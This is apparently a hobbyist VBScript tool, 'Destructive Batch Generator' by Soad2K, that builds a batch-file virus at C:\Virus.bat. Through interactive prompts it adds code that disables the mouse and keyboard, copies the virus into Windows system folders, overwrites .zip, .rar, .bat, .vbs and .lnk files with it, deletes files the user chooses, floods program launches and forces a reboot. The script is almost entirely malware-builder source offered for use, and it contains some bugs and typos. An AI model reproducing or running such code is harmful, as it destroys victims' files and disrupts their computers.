   ' Destructive Batch Generator
   ' By Soad2K
   Dim ech, write, fs, del, copy, md, random, extra, ech2, re, re2, mouse, re3
   Dim ech3, ech4, all, all2, copy, supercopy, md2, del3, del4, start1, start2
   Dim start3, shut, start, read, a
   Set fs = createobject("scripting.filesystemobject")
   Set write = fs.createtextfile ("C:\Virus.bat")
   ech = msgbox("Do you want echo on? ", vbYesno)
   If ech = vbno Then
   write.writeline ("@echo off")
   Else
   write.writeline ("@echo on")
   ech2 = msgbox("Do you want any echo's? ", vbYesno)
    If ech2 = vbyes Then
     ech3 = inputbox("How many echo's do you want?")
     For i = 1 To ech3
      ech4 = inputbox("What do you want your echo to say? ")
      write.writeline ("Echo ")&ech4
     Next
    Else
     Msgbox "ok no echo's"
    End If
   End If
   write.writeline ("rem This is a Soad2K production virus.")
   write.writeline ("rem Created with destrutive batch v1.1")
   re = msgbox("Do you want any remarks?", vbYesno)
   If re = vbyes Then
    write.writeblanklines(1)
   re2 = inputbox("How many? ")
   For i = 1 To re2
    re3 = inputbox("What do you want it to say? ")
    write.writeline ("rem ")&re3
   Next
   Else
   msgbox "ok no remarks."
   End If
   write.writeline ("cls")
   mouse = msgbox("Do you want to dissable the mouse and keyboard *it only works on some os*", vbYesno)
   If mouse = vbyes Then
    write.writeline ("c:\windows\rundll32 mouse,disable")
    write.writeline ("c:\windows\rundll32 keyboard,disable")
   Else
    msgbox "the mouse will not be dissabled"
   End If
   copy = msgbox("Do you want to copy the virus?", vbYesno)
   If copy = vbyes Then
    write.writeblanklines(1)
    all = inputbox("All over or in a specific folder?")
    all2 = inputbox("How many times? *there is not limit* ")
      If all = "all over" Then
       For i = 1 To all2
        write.writeline ("copy %0 C:\%random%.bat")
        write.writeline ("copy %0 C:\progra~1\%random%.bat")
        write.writeline ("copy %0 C:\winnt\%random%.bat")
        write.writeline ("copy %0 C:\windows\%random%.bat")
        write.writeline ("copy %0 C:\winnt\system32\%random%.bat")
        write.writeline ("copy %0 C:\windows\system32\%random%.bat")
        write.writeline ("copy %0 C:\docume~1\%random%.bat")
        write.writeline ("copy %0 C:\docume~1\alluse~1\desktop\%random%.bat")
       Next
      Else
       For i = 1 To all2
        write.writeline ("copy %0 C:\%random%.bat")
       Next
      End If
   Else
    msgbox "Ok no copies"
   End If
   supercopy = msgbox("Do you want to do .rar .ink .vbs .bat .zip copy? ", vbYesno)
   If supercopy = vbyes Then
    write.writeline ("For %%a In (*.Ink) DO copy %0 %%a")
    write.writeline ("For %%a In (*.zip) DO copy %0 %%a")
    write.writeline ("For %%a In (*.Bat) DO copy %0 %%a")
    write.writeline ("For %%a In (*.Rar) Do copy %0 %%a")
    write.writeline ("For %%a In (*.Vbs) DO copy %0 %%a")
   Else
    msgbox "The super copy will not be made."
   End If
   md = msgbox("Do you want to make any directoreis? ", vbYesno)
   If md = vbyes Then
    write.writeblanklines(1)
    md2 = inputbox("How many? ")
   For i = 1 To md2
    write.writeline ("md C:\%random%")
    Next
   Else
    msgbox "No directorys made."
   End If
   del = msgbox("Do you want to delete anything? ", vbYesno)
   If del = vbyes Then
    write.writeblanklines(1)
    msgbox "You must put the directory of the file and its name like C:\winnt\blah.exe "
      For i = 1 To del3
       del4 = inputbox("What is the directory of the program?")
       write.writeline ("Del ")&del4
      Next
   Else
    msgbox "Nothing will be deleted"
   End If
   start = msgbox("Do you want to start any programs ?", vbYesno)
   If start = vbyes Then
    write.writeblanklines(1)
    start1 = inputbox("How many times do you want it started? ")
    start2 = msgbox("Do you care what file is started ?", vbYesno)
     If start2 = "yes" Then
      For i = 1 To start1
       start3 = inputbox("What program do you want started ?")
       write.writeline ("start ")&start3
      Next
     Else
      For i = 1 To start1
       write.writeline ("start notepad")
       write.writeline ("start command")
       write.writeline ("start mspaint")
      Next
     End If
   Else
    msgbox "Nothing will be started"
   End If
   shut = msgbox("Do you want to shutdown their pc? *this only works on some os*", vbYesno)
   If shut = vbyes Then
    wrtie.writeline ("RUNDLL32 SHELL32.DLL,SHExitWindowsEx 1.")
    write.writeline ("shutdown -r -t 10")
   Else
    msgbox "There computer will not be shutdown"
   End If
   Set read = fs.opentextfile ("C:\virus.bat")
   a = read.readall
   msgbox a
